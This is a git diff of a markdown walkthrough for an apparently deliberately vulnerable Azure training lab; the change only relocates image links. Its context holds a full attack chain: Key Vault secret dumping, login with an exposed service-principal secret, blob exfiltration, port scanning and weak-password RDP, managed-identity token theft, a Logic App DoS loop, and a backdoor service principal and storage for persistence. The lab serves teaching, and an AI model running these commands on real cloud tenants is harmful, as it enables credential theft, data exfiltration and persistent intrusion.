@@ -463,37 +463,37 @@ Low privilege (Reader) → Reconnaissance → Credential theft → Privilege esc
 az resource list --resource-group SeasidesTraining 
 --output table
 ```
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 ```bash
 az keyvault list --resource-group SeasidesTraining
 ```
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 ```bash
 az storage account list --resource-group SeasidesTraining
 ```
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 ```bash
 az vm list --resource-group SeasidesTraining --show-details
 ```
-![alt text](image-4.png)
+![alt text](images/image-4.png)
 ```bash
 az identity list --resource-group SeasidesTraining
 ```
-![alt text](image-5.png)
+![alt text](images/image-5.png)
 
 <span style="color: red;">Failed Command.</span>
 
 ```bash
 az network nsg rule list --nsg-name vulnerable-nsg
 ```
-![alt text](image-6.png)
+![alt text](images/image-6.png)
 
 <span style="color: green;">Fixed Command.</span>
 
 ```bash
 az network nsg rule list --resource-group SeasidesTraining --nsg-name vulnerable-nsg
 ```
-![alt text](image-7.png)
+![alt text](images/image-7.png)
 
 #### **PHASE 2: Key Vault Exploitation (Credential Theft)**
 
@@ -501,7 +501,7 @@ az network nsg rule list --resource-group SeasidesTraining --nsg-name vulnerable
 ```bash
 az keyvault secret list --vault-name kv-vuln-4zdn0r --output table
 ```
-![alt text](image-8.png)
+![alt text](images/image-8.png)
 
 **Step 2.2: Exfiltrate All Secrets**
 ```bash
@@ -510,10 +510,10 @@ API_KEY=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name api-key --q
 SP_CLIENT_ID=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-client-id --query value -o tsv)
 SP_SECRET=$(az keyvault secret show --vault-name kv-vuln-4zdn0r --name service-principal-secret --query value -o tsv)
 ```
-![alt text](image-9.png)
+![alt text](images/image-9.png)
 
 **How Secrets are stored in Variables**
-![alt text](image-10.png)
+![alt text](images/image-10.png)
 
 #### **PHASE 3: Privilege Escalation via Service Principal**
 
@@ -526,11 +526,11 @@ az login --service-principal \
   -p "pWQ8Q~wgiICLb1_iYkzrzlkTPNZdIKLFLCT7KaOK" \
   --tenant "48af3af8-817e-42f2-b1e6-a7407e682b7e"
 ```
-![alt text](image-11.png)
+![alt text](images/image-11.png)
 
 <span style="color: red;">If this login fails like this</span>
 
-![alt text](image-35.png)
+![alt text](images/image-35.png)
 
 <span style="color: green;"><b>Then add this manually</b></span>
 
@@ -558,7 +558,7 @@ az login --service-principal \
 
 **Then It will work**
 
-![alt text](image-36.png)
+![alt text](images/image-36.png)
 
 
 
@@ -566,25 +566,25 @@ az login --service-principal \
 ```bash
 az account show
 ```
-![alt text](image-12.png)
+![alt text](images/image-12.png)
 
 <span style="color: red;">Failed Command.</span>
 
 ```bash
 az role assignment list --all --output table
 ```
-![alt text](image-14.png)
+![alt text](images/image-14.png)
 
 <span style="color: green;">Fixed Command.</span>
 
 ```bash
  az role assignment list --all 
  ```
-![alt text](image-15.png)
+![alt text](images/image-15.png)
 ```bash
 az resource list --resource-group SeasidesTraining 
 ```
-![alt text](image-16.png)
+![alt text](images/image-16.png)
 
 #### **PHASE 4: Storage Account Data Exfiltration**
 **Method A: Anonymous Access (No Authentication!)**
@@ -593,14 +593,14 @@ az resource list --resource-group SeasidesTraining
 curl -o "confidential.txt" \
   "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/confidential.txt"
 ```
-![alt text](image-17.png)
-![alt text](image-18.png)
+![alt text](images/image-17.png)
+![alt text](images/image-18.png)
 
 ```bash
 curl -o "customers.csv" \
   "https://stvuln4zdn0r.blob.core.windows.net/sensitive-data/customers.csv"
 ```
-![alt text](image-19.png)
+![alt text](images/image-19.png)
 
 **Method B: Using Storage Account Key (As Contributor)**
 ```bash
@@ -615,7 +615,7 @@ az storage blob list \
   --account-key $STORAGE_KEY
 ```
 
-![alt text](image-20.png)
+![alt text](images/image-20.png)
 
 ```bash
 az storage blob download \
@@ -625,7 +625,7 @@ az storage blob download \
   --file exfiltrated-confidential.txt \
   --account-key $STORAGE_KEY
 ```
-![alt text](image-21.png)
+![alt text](images/image-21.png)
 
 #### **PHASE 5: VM Compromise & Managed Identity Abuse**
 **Part A: Network-Based Attack**
@@ -633,7 +633,7 @@ az storage blob download \
 ```bash
 az vm list-ip-addresses --resource-group SeasidesTraining
 ```
-![alt text](image-37.png)
+![alt text](images/image-37.png)
 
 
 **Step 5.1: Port Scan**
@@ -645,7 +645,7 @@ nmap -p 22,80,3389,5985 20.235.102.210
 ```bash
 nmap -Pn --open -p 22,80,3389,5985 20.235.102.210
 ```
-![alt text](image-22.png)
+![alt text](images/image-22.png)
 
 **Step 5.2: RDP Access with Weak Password**
 
@@ -654,15 +654,15 @@ nmap -Pn --open -p 22,80,3389,5985 20.235.102.210
 ```bash
  rdesktop 20.235.102.210 -u azureuser -p 'WeakPassword123!' 
  ```
-![alt text](image-23.png)
+![alt text](images/image-23.png)
 
 <span style="color: green;">Fixed/Updated Command</span>
 
 ```bash
 xfreerdp3 /v:20.235.102.210 /u:azureuser /p:'WeakPassword123!' /cert:ignore
 ```
-![alt text](image-24.png)
-![alt text](image-25.png)
+![alt text](images/image-24.png)
+![alt text](images/image-25.png)
 
 **Part B: Managed Identity Exploitation**
 **Step 5.3: Test Managed Identity (From Inside VM)**
@@ -675,7 +675,7 @@ $response = Invoke-RestMethod `
 # Got access token!
 $token = $response.access_token
 ```
-![alt text](image-26.png)
+![alt text](images/image-26.png)
 
 **Step 5.4: Access Key Vault from VM**
 ```bash
@@ -695,7 +695,7 @@ Invoke-RestMethod `
   -Uri 'https://kv-vuln-4zdn0r.vault.azure.net/secrets/db-password?api-version=7.4' `
   -Headers $headers
 ```
-![alt text](image-27.png)
+![alt text](images/image-27.png)
 
 **Step 5.5: Full Resource Access from VM**
 
@@ -708,7 +708,7 @@ LOGIC_APP_URL=$(az rest --method post \
   --uri "https://management.azure.com/subscriptions/650ed9ab-493a-4e6f-a4e7-f13e28e5dc6a/resourceGroups/SeasidesTraining/providers/Microsoft.Logic/workflows/vulnerable-workflow/triggers/manual/listCallbackUrl?api-version=2016-06-01" \
   --query value -o tsv)
   ```
-![alt text](image-28.png)
+![alt text](images/image-28.png)
 
 **Step 6.2: Trigger Without Authentication**
 ```bash
@@ -717,7 +717,7 @@ curl -X POST "$LOGIC_APP_URL" \
   -H "Content-Type: application/json" \
   -d '{"secret": "malicious_data", "action": "exfiltrate"}'
 ```
-![alt text](image-29.png)
+![alt text](images/image-29.png)
 
 **Step 6.3: DoS Attack**
 ```bash
@@ -729,8 +729,8 @@ for i in {1..100}; do
     --silent &
 done
 ```
-![alt text](image-30.png)
-![alt text](image-31.png)
+![alt text](images/image-30.png)
+![alt text](images/image-31.png)
 
 #### **PHASE 7: Establish Persistence**
 **Step 7.1: Create Backdoor Service Principal**
@@ -759,7 +759,7 @@ az storage account create \
   --sku Standard_LRS \
   --allow-blob-public-access true
   ```
-![alt text](image-32.png)
+![alt text](images/image-32.png)
 
 ```bash
 # Create public container
@@ -768,7 +768,7 @@ az storage container create \
   --account-name $BACKDOOR_STORAGE \
   --public-access blob
 ```
-![alt text](image-33.png)
+![alt text](images/image-33.png)
 
 #### Step 7.3: Copy Data to Backdoor
 ```bash
@@ -784,7 +784,7 @@ az storage blob upload \
   --file exfiltrated-confidential.txt \
   --account-key $BACKDOOR_KEY
 ```
-![alt text](image-34.png)
+![alt text](images/image-34.png)
 
 
 
